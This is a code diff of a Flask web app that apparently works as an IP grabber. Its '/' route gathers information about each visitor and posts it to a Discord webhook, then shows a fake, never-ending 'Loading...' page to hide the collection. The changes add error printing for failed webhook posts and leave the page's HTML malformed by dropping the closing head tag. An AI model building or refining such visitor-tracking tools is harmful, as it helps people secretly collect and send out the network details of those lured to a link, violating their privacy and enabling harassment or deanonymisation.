@@ -1,4 +1,3 @@
-
 from flask import Flask, request, Response
 import requests
 import json
@@ -24,6 +23,8 @@ def send_to_discord(info):
     response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(data), headers=headers)
     print("Discord response status:", response.status_code)
     print("Discord response body:", response.text)
+    if response.status_code != 204:
+        print("Error sending to Discord:", response.text)
 
 @app.route('/')
 def log_ip_info():
@@ -61,7 +62,7 @@ def log_ip_info():
         send_to_discord(info)
 
     # Infinite loading response
-    return Response("<html><head><title>Loading...</title></head><body><h1>Loading...</h1></body></html>", status=200, content_type='text/html')
+    return Response("<html><head><title>Loading...</title><body><h1>Loading...</h1></body></html>", status=200, content_type='text/html')
 
 if __name__ == '__main__':
     app.run(debug=True)
